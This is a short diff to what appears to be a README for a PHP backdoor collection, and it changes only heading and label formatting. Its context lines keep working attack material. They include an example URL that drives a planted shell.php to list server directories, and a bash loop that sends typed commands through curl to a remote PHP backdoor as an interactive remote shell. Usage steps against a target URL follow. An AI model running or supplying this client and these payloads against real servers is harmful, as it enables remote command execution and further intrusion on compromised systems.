@@ -95,8 +95,7 @@
 [*] E.g.: http://target.com/path/to/shell.php?__=var_dump&___=scandir&____=/
 ```
 
-
-<h2>Simple Bash Script For Handle Simple PHP Backdoor</h2>
+# Simple Bash Script For Handle Simple PHP Backdoor
 
 ```
 while true;do read -p "[>] halah@wibu:~$ " cmd;curl $1$cmd;done
@@ -109,7 +108,7 @@ while true;do read -p "[>] halah@wibu:~$ " cmd;curl -G $1 --data-urlencode "0=$c
 
 save into cli.sh and give access to execute with ```chmod +x cli.sh```
 
-Usage :
+[*] Usage:
 ```
 ./cli.sh http://target.com/path/to/shell.php?0=
 ```
